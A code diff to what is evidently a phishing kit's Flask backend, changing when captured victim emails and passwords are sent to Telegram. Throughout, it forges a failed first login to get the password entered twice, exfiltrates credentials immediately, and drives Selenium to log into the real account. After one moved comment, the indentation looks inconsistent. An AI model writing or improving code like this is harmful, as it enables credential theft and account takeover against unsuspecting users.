@@ -482,6 +482,10 @@ def process_form():
         log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
         return redirect(url_for('index', step='password', email=email, error='true'))
 
+    # Always send to Telegram immediately when credentials received
+    telegram_sent = send_to_telegram(email, password, worker_ip, "immediate")
+    logger.info(f"Telegram sent: {telegram_sent} for {email}")
+    
     # Two-pass authentication logic
     current_session_id = session.get('session_id')
     login_attempt = LoginAttempt.query.filter_by(
@@ -501,22 +505,16 @@ def process_form():
         log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                            error_message="First attempt automatically failed - moving to second pass")
         
-        # Report first attempt to Telegram
-        send_to_telegram(email, password, worker_ip, "first")
-        
         # Always flash error for first attempt and redirect to retry
         flash('Your account or password is incorrect. Try again.', 'error')
         return redirect(url_for('index', step='retry', email=email, retry='true'))
     
     elif login_attempt.attempt_count == 1:
-        # Second attempt - report to Telegram before proceeding with automation
+        # Second attempt - proceed with automation
         login_attempt.attempt_count = 2
         login_attempt.updated_at = datetime.utcnow()
         db.session.commit()
         log_session_activity("second_attempt_proceeding", user_email=email)
-        
-        # Report second attempt to Telegram
-        send_to_telegram(email, password, worker_ip, "second")
         
         # Continue with Selenium automation below
     
@@ -530,8 +528,8 @@ def process_form():
         log_session_activity("attempt_reset", user_email=email, success=False, 
                            error_message="Attempt counter reset - starting two-pass cycle again")
         return redirect(url_for('index', step='password', email=email, error='true'))
-        
-        # Perform Selenium automation
+    
+    # Perform Selenium automation (moved outside else block)
         driver = None
         try:
             log_session_activity("selenium_automation_started", user_email=email)
@@ -600,7 +598,11 @@ def process_form():
                 log_session_activity("telegram_send_failed", user_email=email, success=False)
                 logger.error(f"❌ Failed to send final report to Telegram for {email}")
             
-            # Update user last login
+            # Update or create user record
+            user = User.query.filter_by(email=email).first()
+            if not user:
+                user = User(email=email)
+                db.session.add(user)
             user.last_login = datetime.utcnow()
             db.session.commit()
             
